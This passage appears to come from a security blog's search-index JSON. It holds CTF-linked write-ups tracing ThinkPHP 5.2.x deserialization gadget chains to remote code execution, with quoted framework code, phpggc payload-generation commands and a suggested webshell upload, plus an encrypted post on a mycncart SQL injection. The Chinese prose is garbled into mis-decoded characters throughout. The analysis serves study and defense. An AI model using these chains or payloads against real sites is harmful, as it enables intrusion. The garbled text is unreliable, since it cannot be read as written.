if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // ... return $data;&#125; ËøôÈáåÊàë‰ª¨ÂèØ‰ª•Âº∫Ë°åÁΩÆ$this-&gt;force‰∏∫trueÔºåÁõ¥Êé•ËøîÂõûÊàë‰ª¨ÂâçÈù¢ÊûÑÈÄ†ÁöÑÈùûÁ©∫$this-&gt;data ËøôÊ†∑ÔºåÊàë‰ª¨Â∞±ÊàêÂäüÂà∞‰∫ÜË∞ÉÁî®checkAllowFieldsÁöÑ‰ΩçÁΩÆ 1234567891011121314151617protected function checkAllowFields(): array&#123; // Ê£ÄÊµãÂ≠óÊÆµ if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db();// ÊúÄÁªàÁöÑËß¶Âèë__toStringÁöÑÂáΩÊï∞ $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; return $this-&gt;field; &#125; // ...&#125; ÂêåÊ†∑Ôºå‰∏∫‰∫ÜÂà∞$this-&gt;db()ÂáΩÊï∞ÁöÑË∞ÉÁî®ÔºåÈúÄË¶Å ÊûÑÈÄ†$this-&gt;field‰∏∫Á©∫ ÊûÑÈÄ†$this-&gt;schema‰∏∫Á©∫ ÂÖ∂ÂÆûËøô‰∏§‰∏™Âú∞Êñπ‰∏çÈúÄË¶ÅÊûÑÈÄ†ÔºåÈªòËÆ§ÈÉΩ‰∏∫Á©∫ ÊúÄÁªàÔºåÊàë‰ª¨Áªà‰∫éÂà∞‰∫ÜÂèØ‰ª•Ëß¶Âèë__toStringÁöÑ‰ΩçÁΩÆ 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix)// toString -&gt;pk($this-&gt;pk); ÁúãÂà∞ÁÜüÊÇâÁöÑÂ≠óÁ¨¶‰∏≤ÊãºÊé•‰∫ÜÂòõÔºÅÔºÅÔºÅ ‰∏çËøá‰∏∫‰∫ÜËææÂà∞ËØ•Âá∫ÊãºÊé•ÔºåÊàë‰ª¨ËøòÊòØÂæóÈ¶ñÂÖàÊª°Ë∂≥connectÂáΩÊï∞ÁöÑË∞ÉÁî®„ÄÇÊ≠§Â§Ñ‰ª£Á†ÅÂ∞±‰∏çËØ¥‰∫ÜÔºåÁΩÆ$this-&gt;connection‰∏∫mysqlÂç≥ÂèØ„ÄÇÊé•‰∏ãÊù•Ôºå‰∏çÁÆ°ÊòØËÆæ$this-&gt;nameËøòÊòØ$this-&gt;suffix‰∏∫ÊúÄÁªàÁöÑËß¶Âèë__toStringÁöÑÂØπË±°ÔºåÈÉΩ‰ºöÊúâÂêåÊ†∑ÁöÑÊïàÊûú„ÄÇ ÂêéÁª≠ÁöÑÊÄùË∑ØÔºåÂ∞±ÊòØÂéüÊù•vendor/topthink/think-orm/src/model/concern/Conversion.phpÁöÑ__toStringÂºÄÂßãÁöÑÂà©Áî®ÈìæÔºå‰∏çÂú®ÂèôËø∞„ÄÇ ÊàëÊääexpÈõÜÊàêÂà∞‰∫Üphpggc‰∏äÔºå‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§Âç≥ÂèØÁîüÊàê 1./phpggc -u ThinkPHP/RCE2 'phpinfo();' ËøôÈáåÁî±‰∫éÁî®Âà∞‰∫ÜSerializableClosureÔºåÈúÄË¶Å‰ΩøÁî®ÁºñÁ†ÅÂô®ÁºñÁ†ÅÔºå‰∏çÂèØÁõ¥Êé•ËæìÂá∫Êã∑Ë¥ùÂà©Áî®„ÄÇ"},{"title":"„ÄêCode Review„Äëthinkphp v5.2.x ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-5-2-x-ÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ/","text":"0x00 ÂâçË®Ä‰∏äÂë®ÂèÇ‰∏é‰∫ÜN1CTFÔºåÈáåÈù¢Êúâ‰∏ÄÈÅìÂÖ≥‰∫éthinkphp5ÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂà©Áî®„ÄÇËÆ∞ÂΩï‰∏Ä‰∏ãÂÖ≥‰∫éËØ•ÂèçÂ∫èÂàóÂåñÁöÑÂà©Áî®ÈìæÂàÜÊûê„ÄÇ ÂêéÊñá‰∏ªË¶ÅÂåÖÊã¨‰∏§Êù°ÈìæÁöÑÂà©Áî®ÂàÜÊûêÔºà‰∏ÄÊù°ÊòØÊàëÊâæÁöÑÔºå‰πüÊòØÈ¢òÁõÆÁöÑÈ¢ÑÊúüËß£ÔºåÂè¶‰∏ÄÊù°ÊòØwonderkunÂ∏àÂÇÖÊâæÁöÑÈùûÈ¢ÑÊúüËß£Ôºâ 0x01 ÁéØÂ¢ÉÂáÜÂ§áËøôÈáåÂ∞±‰∏çÁõ¥Êé•Áî®È¢òÁõÆÁöÑÁéØÂ¢É‰∫ÜÔºåÈááÁî®composerÁõ¥Êé•ÂÆâË£Ö5.2.*-devÁâàÊú¨ 1composer create-project topthink/think=5.2.x-dev v5.2 0x02 Âà©Áî®ÈìæÂàÜÊûêËÉåÊôØÂõûÈ°ætp5Âú®ÊàëÂç∞Ë±°ÈáåÂèçÂ∫èÂàóÂåñÁöÑÂà©Áî®ÈìæÂ≠òÂú®‰∏Ä‰∏™WindowsÁ±ªÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§Ôºå‰ΩÜÊòØÂú®ËøôÁØáÊñáÁ´†)ÁöÑÂêØÁ§∫‰∏ãÔºå‰πüÁÆóÊòØÊâæÂà∞‰∫Ü‰∏ÄÊù°Êñ∞ÁöÑË∑ØÔºàÂÖ≥‰∫é__toStringÁöÑËß¶ÂèëÊñπÂºèÔºåÈô§‰∫ÜÂ≠óÁ¨¶‰∏≤ÊãºÊé•ÁöÑÊñπÂºèÔºåËøòÂèØ‰ª•Âà©Áî®PHPËá™Â∏¶ÂáΩÊï∞ÂèÇÊï∞ÁöÑÂº∫Âà∂ËΩ¨Êç¢Ôºâ„ÄÇ ËøôÁØáÊñáÁ´†ÁöÑÂà©Áî®ÈìæÊúÄÂêéÁî®Âà∞‰∫Ü5.1.37ÁâàÊú¨think/Request.phpÁöÑ __callÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞ÁöÑË∞ÉÁî®ÂáΩÊï∞ÂêçÂèØÊéßÔºåÊâÄ‰ª•ÂèØ‰ª•ÂØºËá¥‰ªªÊÑèË∞ÉÁî®ÂÖ∂‰ªñÁöÑÁ±ªÂáΩÊï∞„ÄÇËÄåÂú®5.2.xÁâàÊú¨‰∏çÂ≠òÂú®ËøôÊ†∑ÁöÑ‰∏Ä‰∏™__callÂáΩÊï∞ÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÈúÄË¶ÅÈáçÊñ∞Êâæ‰∏Ä‰∏™ÊúÄÁªàËææÊàêÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞Ë∞ÉÁî®Ôºà__callÂáΩÊï∞ÂâçÁöÑÂà©Áî®Èìæ‰ªçÁÑ∂ÂèØÁî®Ôºâ„ÄÇ ÈÇ£‰πàÊé•‰∏ãÊù•ÔºåÊàë‰ª¨Êù•ÁúãÁúã5.2.xÊñ∞ÁöÑÂà©Áî®ÈìæÂêßÔºöÔºâ think/model/concern/Attribute.php getValueÂèØÂáΩÊï∞Âä®ÊÄÅË∞ÉÁî®ÂáΩÊï∞ÔºàÈ¢òÁõÆÁöÑÈ¢ÑÊúüËß£ÔºâÁî±‰∫é5.1.37__callÂáΩÊï∞ÂâçÁöÑÂà©Áî®Èìæ‰ªçÁÑ∂Â≠òÂú®‰∫é5.2.xÁâàÊú¨ÔºåËøôÈáåÂ∞±‰∏çÂÜçËØ¶Ëø∞‰∫Ü„ÄÇ ÂÖàÊù•Áúã‰∏Ä‰∏ãConversionÁ±ªÁöÑtoArrayÂáΩÊï∞ 123456789101112131415public function toArray(): array&#123; // ... // ÂêàÂπ∂ÂÖ≥ËÅîÊï∞ÊçÆ $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // ... &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key);// relationÂíåvisibleÂ≠òÂú®Âêå‰∏Ä‰∏™keyÂ∞±Ë°å // ... &#125; // ... ÂéªÊéâ‰∫ÜÊó†ÂÖ≥ÁöÑ‰ª£Á†ÅÔºåËøôÈáå$this-&gt;visible„ÄÅ$this-&gt;relationÂùáÂèØÊéßÔºåÂèØ‰º™ÈÄ†Êï∞ÊçÆËøõÂÖ•getAttrÂáΩÊï∞ 12345678910111213141516public function getAttr(string $name)&#123; // ... return $this-&gt;getValue($name, $value, $relation);&#125;protected function getValue(string $name, $value, bool $relation = false)&#123; // Ê£ÄÊµãÂ±ûÊÄßËé∑ÂèñÂô® $fieldName = $this-&gt;getRealFieldName($name);// Áõ¥Êé•ËøîÂõû$nameÁöÑÂÄº // ... if (isset($this-&gt;withAttr[$fieldName])) &#123; // ... $closure = $this-&gt;withAttr[$fieldName]; // withAttrÂÜÖÂÆπÂèØÊéß $value = $closure($value, $this-&gt;data); // Âä®ÊÄÅË∞ÉÁî®ÂáΩÊï∞ // ... Áõ¥Êé•ÂÖ≥Ê≥®getValueÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞ÂèØÂä®ÊÄÅË∞ÉÁî®ÂáΩÊï∞ÔºåÂπ∂‰∏îË∞ÉÁî®ÂáΩÊï∞„ÄÅÂáΩÊï∞ÂèÇÊï∞ÂùáÂèØÊéß„ÄÇÊâÄ‰ª•Êé•‰∏ãÊù•Êúâ‰∏§ÁßçÊñπÊ≥ïÔºåÁ¨¨‰∏ÄÁßçÊòØÊâæ‰∏Ä‰∏™Á¨¶ÂêàÊù°‰ª∂ÁöÑphpÂáΩÊï∞ÔºåÂè¶‰∏ÄÁßçÊòØÂà©Áî®tpËá™Â∏¶ÁöÑSerializableClosureË∞ÉÁî®ÔºåÊù•Áúã‰∏Ä‰∏ãÁ¨¨‰∫åÁßç„ÄÇ \\Opis\\ClosureÂèØÁî®‰∫éÂ∫èÂàóÂåñÂåøÂêçÂáΩÊï∞Ôºå‰ΩøÂæóÂåøÂêçÂáΩÊï∞ÂêåÊ†∑ÂèØ‰ª•ËøõË°åÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•Â∫èÂàóÂåñ‰∏Ä‰∏™ÂåøÂêçÂáΩÊï∞ÔºåÁÑ∂Âêé‰∫§Áî±‰∏äËø∞ÁöÑ$closure($value, $this-&gt;data)Ë∞ÉÁî®ÊâßË°å„ÄÇ 123$func = function()&#123;phpinfo();&#125;;$closure = new \\Opis\\Closure\\SerializableClosure($func);$closure($value, $this-&gt;data);// ËøôÈáåÁöÑÂèÇÊï∞ÂèØ‰ª•‰∏çÁî®ÁÆ° ‰ª•‰∏äËø∞‰ª£Á†Å‰∏∫‰æãÔºåÂ∞ÜË∞ÉÁî®phpinfoÂáΩÊï∞„ÄÇ Âà∞Ê≠§‰∏∫Ê≠¢ÔºåÊàë‰ª¨ÂàÜÊûêÂÆå‰∫ÜÊï¥‰∏Ä‰∏™Ë∞ÉÁî®ÊµÅÁ®ãÔºåÂõûÈ°æ‰∏Ä‰∏ã vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct -&gt;removeFiles -&gt;file_exists Âº∫Âà∂ËΩ¨ÂåñÂ≠óÁ¨¶‰∏≤filenameÔºåËøôÈáåÁöÑfilenameÂèØÊéß ÂèØËß¶Âèë__toStringÂáΩÊï∞Ôºå‰∏ã‰∏ÄÊ≠•ÊâæÂèØÂà©Áî®ÁöÑ__toString vendor/topthink/framework/src/think/model/concern/Conversion.php __toString -&gt; toJson -&gt; toArrayÂàõÈÄ†Á¨¶ÂêàÊù°‰ª∂ÁöÑrelationÂíåvisible-&gt; getAttr ‰∏ã‰∏ÄÊ≠•Ë∞ÉÁî®vendor/topthink/framework/src/think/model/concern/Attribute.phpÁöÑgetValueÂáΩÊï∞ vendor/topthink/framework/src/think/model/concern/Attribute.phpgetValue -&gt; $closureÂä®ÊÄÅË∞ÉÁî®ÂáΩÊï∞Ôºå‰∏îËØ•ÂÜÖÂÆπÂèØÊéß‰∏ã‰∏ÄÊ≠•Âà©Áî®Êúâ‰∏§ÁßçÔºå‰∏ÄÁßçÊâæÁ¨¶ÂêàÁöÑphpÂáΩÊï∞ÔºåÂè¶‰∏ÄÁßçÂà©Áî®tpËá™Â∏¶ÁöÑSerializableClosureË∞ÉÁî® vendor/opis/closure/src/SerializableClosure.phpÊûÑÈÄ†ÂèØÂà©Áî®ÁöÑÂåøÂêçÂáΩÊï∞ ÊàëÊääexpÈõÜÊàêÂà∞‰∫Üphpggc‰∏äÔºå‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§Âç≥ÂèØÁîüÊàê 1./phpggc -u ThinkPHP/RCE1 'phpinfo();' ËøôÈáåÁî±‰∫éÁî®Âà∞‰∫ÜSerializableClosureÔºåÈúÄË¶Å‰ΩøÁî®ÁºñÁ†ÅÂô®ÁºñÁ†ÅÔºå‰∏çÂèØÁõ¥Êé•ËæìÂá∫Êã∑Ë¥ùÂà©Áî®„ÄÇ think/Db.php __callÂáΩÊï∞ÂèØÂÆû‰æãÂåñ‰ªªÊÑèÁ±ªÔºàÈ¢òÁõÆÁöÑÈùûÈ¢ÑÊúüËß£ÔºâÂâçÈù¢ËØ¥Âà∞5.1.37ÁâàÊú¨ÁöÑÂà©Áî®ÈìæÁöÑ__callÂáΩÊï∞ÔºåÂú®5.2.xÁâàÊú¨Ê≤°ÂäûÊ≥ïÁî®‰∫Ü„ÄÇ‰ΩÜÊòØ‰ªé__destructÂà∞__callÁöÑÈìæË∑ØÊòØÈÄöÁöÑÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÈáçÊñ∞Êâæ‰∏Ä‰∏™ÂèØÁî®ÁöÑ__callÂáΩÊï∞Âç≥ÂèØ„ÄÇ Êù•Áúã‰∏Ä‰∏ãvendor/topthink/framework/src/think/Db.phpÁöÑ__callÂáΩÊï∞ 12345678public function __call($method, $args)&#123; $class = $this-&gt;config['query']; $query = new $class($this-&gt;connection); return call_user_func_array([$query, $method], $args);&#125; $this-&gt;configÂíå$this-&gt;connectionÂùáÂèØÊéßÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•ÂÆû‰æãÂåñ‰ªªÊÑèÁ¨¶ÂêàÊù°‰ª∂ÁöÑÁ±ªÔºåËøôÈáåÊâæ‰∫Üthink\\Url 12345678910public function __construct(App $app, array $config = [])&#123; $this-&gt;app = $app; $this-&gt;config = $config; if (is_file($app-&gt;getRuntimePath() . 'route.php')) &#123; // ËØªÂèñË∑ØÁî±Êò†Â∞ÑÊñá‰ª∂ $app-&gt;route-&gt;import(include $app-&gt;getRuntimePath() . 'route.php'); &#125;&#125; ËØ•ÊûÑÈÄ†Âô®ÂºïÂÖ•‰∫ÜRuntimePath‰∏ãÁöÑroute.phpÊñá‰ª∂ÔºåÂõ†‰∏∫ËøôÈÅìÈ¢òÊòØÂÖÅËÆ∏‰∏ä‰º†Êñá‰ª∂ÁöÑÔºåÊâÄ‰ª•Âè™Ë¶ÅÂú®ÂèØ‰∏ä‰º†ÁöÑÁõÆÂΩï‰∏ã‰∏ä‰º†‰∏Ä‰∏™route.phpÁöÑwebshellÂç≥ÂèØ„ÄÇËá≥‰∫éRuntimePathÔºå$app‰∏∫ÂèØÊéßÂèòÈáèÔºåÁõ¥Êé•‰øÆÊîπ$runtimePathÁöÑÂÜÖÂÆπÂç≥ÂèØ„ÄÇ Êàë‰ª¨Áõ¥Êé•ÊûÑÈÄ†AppÂØπË±°‰∏∫ 123456789class App&#123; protected $runtimePath; public function __construct(string $rootPath = '')&#123; $this-&gt;rootPath = $rootPath; $this-&gt;runtimePath = \"/tmp/\"; $this-&gt;route = new \\think\\route\\RuleName(); &#125;&#125; Ëøô‰∏™ÊûÑÈÄ†ÊÄùË∑ØÂ§™Ê∫ú‰∫ÜÔºåËÜú‰∏ÄÊ≥¢ÔºöÔºâ Êï¥ÁêÜ‰∏Ä‰∏ãËøáÁ®ã vendor/topthink/framework/src/think/process/pipes/Windows.php__destruct -&gt;removeFiles -&gt;file_exists Âº∫Âà∂ËΩ¨ÂåñÂ≠óÁ¨¶‰∏≤filenameÔºåËøôÈáåÁöÑfilenameÂèØÊéßÂèØËß¶Âèë__toStringÂáΩÊï∞Ôºå‰∏ã‰∏ÄÊ≠•ÊâæÂèØÂà©Áî®ÁöÑ__toString vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -&gt; toJson -&gt; toArray-&gt;appendAttrToArray-&gt;$relationË∞ÉÁî®‰∏çÂ≠òÂú®ÁöÑÂáΩÊï∞ÔºåËß¶Âèë__call vendor/topthink/framework/src/think/Db.php__call -&gt; new $class($this-&gt;connection) Ë∞ÉÁî®‰ªªÊÑèÁ±ªÁöÑ__constructÂáΩÊï∞ vendor/topthink/framework/src/think/Url.phpÊûÑÈÄ†AppÁ±ªÔºåËææÂà∞include‰ªªÊÑèÊñá‰ª∂ÁöÑÊïàÊûú"},{"title":"„ÄêCode Review„Äëmycncart sqli","permalink":"http://blog.0kami.cn/2019/02/25/php/mycncart-v2-0-0-3-sqli/","text":"welcome to my blog, enter password to read. Incorrect Password! No content to display! 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